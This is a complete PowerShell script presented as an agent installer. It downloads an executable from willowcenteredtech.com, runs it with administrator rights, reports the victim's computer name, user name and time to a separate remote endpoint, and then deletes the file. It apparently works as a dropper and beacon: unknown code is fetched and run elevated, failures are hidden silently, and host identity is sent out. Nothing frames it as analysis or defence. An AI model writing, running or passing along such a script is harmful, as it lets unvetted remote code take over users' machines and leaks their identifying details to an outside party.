$Temp = Join-Path $env:TEMP "AGENT_479647_V10_15_3_RW.EXE"
$Url = "https://www.willowcenteredtech.com/downloads/AGENT_479647_V10_15_3_RW.EXE"

$WorkerURL = "https://install.willowcenteredtech.com"


function Send-Notification {
    param(
        $Message
    )

    try {

        Invoke-RestMethod `
        -Uri $WorkerURL `
        -Method POST `
        -ContentType "application/json" `
        -Body (@{
            message = $Message
        } | ConvertTo-Json)

    }
    catch {

    }
}



try {

    Invoke-WebRequest `
    -Uri $Url `
    -OutFile $Temp `
    -ErrorAction Stop


    Start-Process `
    $Temp `
    -ArgumentList "-ai" `
    -Verb RunAs `
    -Wait


    Send-Notification "
✅ Agent Installation Complete

Computer: $env:COMPUTERNAME
User: $env:USERNAME
Time: $(Get-Date)
"


}
catch {

    Send-Notification "
❌ Agent Installation Failed

Computer: $env:COMPUTERNAME
User: $env:USERNAME

Error:
$($_.Exception.Message)
"

}


finally {

    if(Test-Path $Temp){
        Remove-Item $Temp -Force
    }

}